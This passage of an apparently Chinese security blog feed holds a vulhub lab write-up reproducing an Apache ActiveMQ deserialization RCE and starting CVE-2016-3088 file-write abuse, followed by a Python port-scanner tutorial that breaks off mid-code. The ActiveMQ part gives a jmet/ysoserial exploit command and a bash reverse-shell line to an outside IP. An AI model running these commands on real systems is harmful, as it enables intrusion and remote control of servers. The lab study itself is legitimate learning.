&lt;p&gt;Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。&lt;/p&gt;

&lt;h3 id=&quot;漏洞复现-5&quot;&gt;漏洞复现：&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;前提：需要使用管理员权限的账号或者诱导管理员点击固定连接&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;· 构造可执行命令的序列化对象&lt;br /&gt;
这里使用的是jmet&lt;a href=&quot;https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar&quot;&gt;下载地址&lt;/a&gt;，jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。也可以单独使用ysoserial并发送。需要注意的是，使用jmet的时候需要在统计目录中创建一个名为external的文件夹，否则可能报文件夹不存在的错误
· 构造消息传递给目标的61616端口&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &lt;span class=&quot;s2&quot;&gt;&quot;touch /tmp/success&quot;&lt;/span&gt; -Yp ROME your-ip 61616
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5d04559c3e45c87197.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;· 使用管理员账号登陆管理界面，http://your-ip:8161/admin/browse.jsp? 点击查看消息详情，出发命令执行。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5d0456dc7307223516.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;· 进入docker查看文件创建情况&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/5d04573291c4e85321.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;· 将运行的命令切换为反弹 shell的命令即可获得目标的shell&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash -i &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/47.102.143.147/222 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;##&lt;/p&gt;

&lt;h1 id=&quot;activemq任意文件写入漏洞cve-2016-3088&quot;&gt;ActiveMQ任意文件写入漏洞（CVE-2016-3088）&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Path:activemq/CVE-2016-3088&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;ActiveMQ的web控制台分三个应用，admin、api和fileserver，fileserver无需登录。&lt;/p&gt;

&lt;p&gt;本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。&lt;/p&gt;

&lt;h4 id=&quot;文件上传getshell的几种方法&quot;&gt;文件上传getshell的几种方法：&lt;/h4&gt;

&lt;p&gt;1、写入webshell，好处是使用的门槛低，但是需要被解析&lt;/p&gt;

&lt;p&gt;2、写入cron或者ssh key，可以直接反弹shell，但是需要roo权限&lt;/p&gt;

&lt;p&gt;3、写入jar，稍微复杂&lt;/p&gt;

&lt;p&gt;4、写入xml配置文件、需要知道activemq的绝对路径&lt;/p&gt;

&lt;h4 id=&quot;上传webshell&quot;&gt;上传webshell&lt;/h4&gt;

&lt;blockquote&gt;
  &lt;p&gt;前提条件：拥有后台管理员权限&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;首先进入http://47.102.143.147:8161/admin/test/systemProperties.jsp 查看activemq的屋里路径：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/vulhub.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 16 Jun 2019 04:49:43 +0800</pubDate>
        <link>http://localhost:4000/2019/06/16/vulhub.html</link>
        <guid isPermaLink="true">http://localhost:4000/2019/06/16/vulhub.html</guid>
        
        <category>漏洞复现</category>
        
        <category>WEB</category>
        
        <category>ALL</category>
        
        
        <category>漏洞复现</category>
        
        <category>WEB</category>
        
        <category>ALL</category>
        
      </item>
    
      <item>
        <title>Python编写扫描器</title>
        <description>&lt;h2 id=&quot;介绍&quot;&gt;介绍：&lt;/h2&gt;
&lt;p&gt;本篇学习笔记将记录使用python编写scan的学习路线，记录整个python扫描器的编写过程，记录从第一行代码到最新版本，对每个版本更新用到的技术进行详解&lt;/p&gt;
&lt;h2 id=&quot;version-10socket库&quot;&gt;Version 1.0（socket库）&lt;/h2&gt;
&lt;h3 id=&quot;使用socket库进行端口扫描&quot;&gt;使用socket库进行端口扫描：&lt;/h3&gt;
&lt;p&gt;更新日志：&lt;br /&gt;
调用socket中的库对目标进行扫描，并统计目标端口的开放情况&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
# -*- coding: UTF-8 -*-
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# import socket
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# 端口扫描模块
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;portScan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;portStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;portEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;open_ports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;portStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;portEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;# 显示扫描百分比
&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;percent&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;float&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;float&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;portEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%.2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;f&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;percent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;# 发送数据，尝试建立连接
&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sock&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;open_ports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;open_ports&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;pass&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 获取ip和端口扫描范围
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;portStart&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;portEnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;portScan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;portStart&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;portEnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;version-11threadpool-多线程&quot;&gt;Version 1.1（Threadpool 多线程）&lt;/h2&gt;
&lt;h3 id=&quot;使用threadpool进行多线程端口扫描&quot;&gt;使用Threadpool进行多线程端口扫描：&lt;/h3&gt;
&lt;p&gt;更新日志：&lt;br /&gt;
调用python中的Threadpool模块，设置多线程多目标的端口进行扫描，增加扫描的效率&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
# -*- coding: UTF-8 -*-
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;datetime&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;multiprocessing.dummy&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Pool&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPool&lt;/span&gt;
 
&lt;span class=&quot;n&quot;&gt;remote_server&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;targetport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;startPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;endPort&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetport&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;remote_server_ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gethostbyname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'-'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'正在对目标： '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote_server_ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'进行扫描'&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'-'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;
 
 
&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setdefaulttimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;scan_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect_ex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_server_ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 如果端口开启 发送 hello 获取banner
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Port {}: OPEN'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;startPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endPort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 
&lt;span class=&quot;c1&quot;&gt;# Check what time the scan started
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 
&lt;span class=&quot;c1&quot;&gt;# 创建线程
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 设置线程数
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;results&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pool&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;scan_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# 设置需要使用多线程的函数名称，传递参数的集合，该函数会将传递参数的集合分条传递到函数中使用
